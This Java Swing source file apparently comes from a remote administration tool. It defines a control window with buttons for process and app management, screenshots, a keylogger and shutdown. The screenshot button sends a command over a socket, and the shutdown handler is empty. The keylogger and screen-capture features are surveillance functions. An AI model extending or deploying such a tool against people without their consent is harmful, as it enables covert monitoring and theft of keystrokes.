package Client.View;

import java.awt.EventQueue;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;

import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;

import General.Commands;

import javax.swing.JButton;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;

public class RemoteForm extends JFrame {

	private static final long serialVersionUID = 1L;
	private JPanel contentPane;
	private Socket socket = null;
	private ClientForm client = null;
	private DataOutputStream dataOutputStream = null;
	private ProcessManagementForm processManagementForm = null;
	private KeyloggerForm keyloggerForm = null;
	private AppManagementForm appManagementForm = null;

	/**
	 * Launch the application.
	 */

	/**
	 * Create the frame.
	 * 
	 * @throws IOException
	 */
	public RemoteForm(Socket socket, ClientForm client) throws IOException {
		this.setSocket(socket);
		this.setClient(client);
		this.dataOutputStream = new DataOutputStream(socket.getOutputStream());
		processManagementForm = client.getProcessManagementForm();
		keyloggerForm = client.getKeyloggerForm();
		appManagementForm = client.getAppManagementForm();

		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setResizable(false);
		setBounds(100, 100, 390, 300);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));

		setContentPane(contentPane);
		contentPane.setLayout(null);

		JButton btnProcessManagement = new JButton("Process Management");
		btnProcessManagement.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				processManagementForm.setVisible(true);
			}
		});
		btnProcessManagement.setBounds(33, 57, 135, 23);
		contentPane.add(btnProcessManagement);

		JButton btnAppManagement = new JButton("App Management");
		btnAppManagement.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				appManagementForm.setVisible(true);
			}
		});
		btnAppManagement.setBounds(33, 91, 135, 23);
		contentPane.add(btnAppManagement);

		JButton btnScreenShot = new JButton("Screen Shot");
		btnScreenShot.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				try {
					dataOutputStream.writeInt(Commands.REQUEST_SCREEN_SHOT.getAbbrev());
					dataOutputStream.flush();
				} catch(Exception err) {
					err.printStackTrace();
				}
			}
		});
		btnScreenShot.setBounds(33, 124, 135, 23);
		contentPane.add(btnScreenShot);

		JButton btnKeylogger = new JButton("Keylogger");
		btnKeylogger.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				keyloggerForm.setVisible(true);
			}
		});
		btnKeylogger.setBounds(33, 158, 135, 23);
		contentPane.add(btnKeylogger);

		JButton btnShutdown = new JButton("Shutdown");
		btnShutdown.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				
			}
		});
		btnShutdown.setBounds(33, 192, 135, 23);
		contentPane.add(btnShutdown);
	}

	public Socket getSocket() {
		return socket;
	}

	public void setSocket(Socket socket) {
		this.socket = socket;
	}

	public ClientForm getClient() {
		return client;
	}

	public void setClient(ClientForm client) {
		this.client = client;
	}

	public AppManagementForm getAppManagementForm() {
		return appManagementForm;
	}

	public void setAppManagementForm(AppManagementForm appManagementForm) {
		this.appManagementForm = appManagementForm;
	}
}
